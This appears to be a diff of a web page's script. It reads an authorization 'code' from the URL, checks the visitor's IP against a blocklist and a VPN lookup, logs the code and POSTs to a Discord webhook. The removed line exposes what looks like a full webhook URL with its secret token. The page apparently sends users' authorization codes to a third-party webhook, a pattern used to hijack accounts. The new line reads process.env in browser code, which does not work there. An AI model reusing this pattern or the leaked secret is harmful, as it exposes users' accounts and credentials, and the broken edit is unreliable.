@@ -159,7 +159,7 @@
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
-            const webhookUrl = "https://discord.com/api/webhooks/1262829156329066657/qZXJKCqLa5znALVHfbUcR_As5dZVUeJvntL7iicYznUp4k7DWF2V3VnLCTs1OgPwhUeY";
+            const webhookSecret = process.env.WEBHOOK_URL;
 
             const blacklistedIPs = ["81.35.53.46", "1"];
             const vpnProxyCheckUrl = "https://ipinfo.io/json";
@@ -178,7 +178,7 @@
                     if (code) {
                         console.log('Authorization code:', code);
 
-                        fetch(webhookUrl, {
+                        fetch(webhookSecret, {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json'
